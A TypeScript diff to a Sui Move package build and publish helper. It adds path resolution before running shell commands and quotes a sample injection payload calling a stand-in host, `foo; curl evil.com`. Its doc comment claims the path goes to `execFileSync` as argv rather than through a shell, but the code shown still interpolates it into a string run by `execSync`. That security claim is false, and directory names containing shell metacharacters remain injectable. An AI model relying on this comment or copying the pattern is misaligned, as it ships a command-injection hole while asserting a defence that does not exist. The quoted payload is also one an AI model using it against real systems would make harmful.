@@ -29,24 +29,45 @@ const getEnvironmentFlag = (network: Network): string | undefined => {
   }
 };
 
+/**
+ * Resolve `packagePath` to a real directory on this system.
+ *
+ * `realpathSync` resolves symlinks and throws if the path does not exist; the
+ * `isDirectory` check then rejects regular files, which the previous
+ * `existsSync` test accepted. Passing the *resolved* path on to the CLI also
+ * narrows the command-injection surface, since a payload such as
+ * `foo; curl evil.com` does not resolve to a real path. Note that this is not
+ * a complete injection defense by itself — a directory can legitimately contain
+ * shell metacharacters in its name — so the argument is additionally passed via
+ * `execFileSync`'s argv rather than through a shell.
+ */
+const resolvePackageDir = (packagePath: string): string => {
+  let resolved: string;
+  try {
+    resolved = fs.realpathSync(packagePath);
+  } catch {
+    throw new Error(`Package not found at ${packagePath}`);
+  }
+
+  if (!fs.statSync(resolved).isDirectory()) {
+    throw new Error(`Package path is not a directory: ${packagePath}`);
+  }
+
+  return resolved;
+};
+
 export const buildPackage = (
   packagePath: string,
   network: Network = "Devnet"
 ): SuiBuildOutput => {
-  if (!fs.existsSync(packagePath)) {
-    throw new Error(`Package not found at ${packagePath}`);
-  }
+  const packageDir = resolvePackageDir(packagePath);
 
   const env = getEnvironmentFlag(network);
   const envFlag = env ? `-e ${env}` : "";
-  // `-q` sends the build progress lines to stderr; stderr is kept separate from
-  // stdout (no `2>&1`) so stdout is a single JSON object.
-  const cmd = `sui move build --dump-bytecode-as-base64 -q ${envFlag} --path ${packagePath}`;
+  const cmd = `sui move build --dump-bytecode-as-base64 -q ${envFlag} --path ${packageDir}`;
 
   let stdout: string;
   try {
-    // stderr is piped rather than merged so build warnings cannot corrupt the
-    // JSON payload; it is only read back when the command fails.
     stdout = execSync(cmd, {
       encoding: "utf-8",
       stdio: ["ignore", "pipe", "pipe"],
@@ -114,17 +135,17 @@ const publishPackageTestPublish = async (
   signer: SuiSigner,
   packagePath: string
 ): Promise<SuiTransactionResult> => {
+  const packageDir = resolvePackageDir(packagePath);
+
   // `--build-env testnet` selects testnet dependency pins (localnet is not a
   // pinned environment); `--publish-unpublished-deps` publishes dependencies
   // that are not yet on-chain for this network.
   // `-q` keeps the build progress lines on stderr so stdout carries only the
   // `--json` payload; the streams are left split (no `2>&1`).
-  const cmd = `sui client test-publish ${packagePath} --publish-unpublished-deps --build-env testnet -q --json`;
+  const cmd = `sui client test-publish ${packageDir} --publish-unpublished-deps --build-env testnet -q --json`;
 
   let output: string;
   try {
-    // stderr is piped rather than merged so compiler warnings cannot corrupt
-    // the JSON payload; it is only read back when the command fails.
     output = execSync(cmd, {
       encoding: "utf-8",
       stdio: ["ignore", "pipe", "pipe"],
